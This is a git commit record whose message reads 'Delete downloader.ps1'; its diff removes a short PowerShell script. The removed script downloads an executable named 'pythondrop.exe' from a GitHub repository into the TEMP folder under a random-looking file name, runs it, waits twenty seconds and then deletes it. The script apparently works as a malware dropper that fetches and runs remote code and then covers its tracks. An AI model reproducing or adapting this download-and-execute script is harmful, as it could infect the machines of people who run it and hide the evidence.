6dbb6e5b73460908983e3029913c753330a3933d
piplup312 <159586529+piplup312@users.noreply.github.com>
2024-03-01 23:53:45 +0530

    Delete downloader.ps1

--- downloader.ps1
+++
@@ -1,6 +0,0 @@
-$dest = $env:TEMP + "\tytykjrklgddgdg.exe"
-Start-BitsTransfer -Source https://github.com/piplup312/tomandjerry/raw/main/pythondrop.exe -Destination $dest
-cd ($env:TEMP)
-.\tytykjrklgddgdg.exe
-Start-Sleep -s 20
-rm .\tytykjrklgddgdg.exe
